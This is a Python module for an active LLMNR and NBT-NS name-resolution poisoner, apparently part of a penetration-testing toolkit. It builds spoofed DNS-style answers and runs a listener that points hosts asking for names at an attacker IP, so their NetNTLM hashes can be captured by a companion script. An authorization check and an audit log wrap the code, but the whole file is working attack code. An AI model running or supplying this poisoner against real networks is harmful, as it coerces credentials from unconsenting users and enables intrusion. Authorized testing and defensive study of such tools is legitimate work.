"""
Active name-resolution poisoner (AUTHORIZED USE ONLY).

The offensive counterpart to poison_monitor: it *answers* LLMNR and NBT-NS name
queries, pointing the asker at an attacker-controlled IP so the victim then tries
to authenticate to us (where `capture.py` collects the NetNTLM hash). This is a
credential-coercion primitive — it only runs after `authorization.require_authorization`
passes, and every action is written to an audit log.

Response *crafting* is pure and testable; the listener loop is the only I/O.
"""

from __future__ import annotations

import socket
import struct
import time
from pathlib import Path
from typing import Dict, List, Optional

from authorization import AuditLog, require_authorization
from poison_monitor import parse_llmnr_query, parse_nbns_query


def build_llmnr_response(query: bytes, attacker_ip: str) -> Optional[bytes]:
    """Craft an LLMNR answer for `query` resolving the asked name to `attacker_ip`."""
    if parse_llmnr_query(query) is None:
        return None
    txid = query[:2]
    question = query[12:]  # qname + qtype + qclass, copied verbatim
    header = txid + struct.pack(">HHHHH", 0x8000, 1, 1, 0, 0)  # QR set, 1 question, 1 answer
    # Answer: name is a compression pointer back to the question at offset 12.
    answer = b"\xc0\x0c" + struct.pack(">HHIH", 0x0001, 0x0001, 30, 4) + socket.inet_aton(attacker_ip)
    return header + question + answer


def build_nbns_response(query: bytes, attacker_ip: str) -> Optional[bytes]:
    """Craft a NBT-NS positive name-query response resolving the name to `attacker_ip`."""
    if parse_nbns_query(query) is None:
        return None
    txid = query[:2]
    rr_name = query[12:46]  # 0x20 length + 32-byte encoded name + null terminator
    header = txid + struct.pack(">HHHHH", 0x8500, 0, 1, 0, 0)  # response+AA, 1 answer
    record = (
        rr_name
        + struct.pack(">HH", 0x0020, 0x0001)  # type NB, class IN
        + struct.pack(">I", 165)              # TTL
        + struct.pack(">H", 6)                # RDLENGTH
        + struct.pack(">H", 0x0000)           # NB flags (unique, B-node)
        + socket.inet_aton(attacker_ip)
    )
    return header + record


_LLMNR_ADDR = ("224.0.0.252", 5355)


def run_poisoner(
    attacker_ip: str,
    *,
    duration: int,
    acknowledged: bool,
    audit_path: str | Path,
    operator: Optional[str] = None,
    verbose: bool = False,
) -> Dict:
    """Answer LLMNR/NBT-NS queries for `duration` seconds. Requires authorization."""
    ctx = require_authorization(acknowledged=acknowledged, operator=operator, target=attacker_ip)
    audit = AuditLog(audit_path)
    audit.record("poison.start", operator=ctx["operator"], attacker_ip=attacker_ip,
                 duration=duration)

    listeners: List[tuple] = []
    for proto, port, builder in (
        ("LLMNR", 5355, build_llmnr_response),
        ("NBT-NS", 137, build_nbns_response),
    ):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("0.0.0.0", port))
            sock.settimeout(0.5)
            listeners.append((proto, sock, builder))
        except OSError as e:
            audit.record("poison.bind_failed", proto=proto, port=port, error=str(e))

    answered: List[Dict] = []
    deadline = time.time() + duration
    try:
        while time.time() < deadline:
            for proto, sock, builder in listeners:
                try:
                    data, addr = sock.recvfrom(4096)
                except (socket.timeout, OSError):
                    continue
                response = builder(data, attacker_ip)
                if response is None:
                    continue
                try:
                    sock.sendto(response, addr)
                except OSError as e:
                    audit.record("poison.send_failed", proto=proto, victim=addr[0], error=str(e))
                    continue
                name = (parse_llmnr_query if proto == "LLMNR" else parse_nbns_query)(data)
                audit.record("poison.answered", proto=proto, victim=addr[0], name=name,
                             pointed_to=attacker_ip)
                answered.append({"proto": proto, "victim": addr[0], "name": name})
                if verbose:
                    print(f"[poison] answered {proto} '{name}' from {addr[0]} -> {attacker_ip}")
    finally:
        for _proto, sock, _builder in listeners:
            sock.close()
        audit.record("poison.stop", answered=len(answered))

    return {"answered": answered, "listeners": [p for p, _s, _b in listeners]}
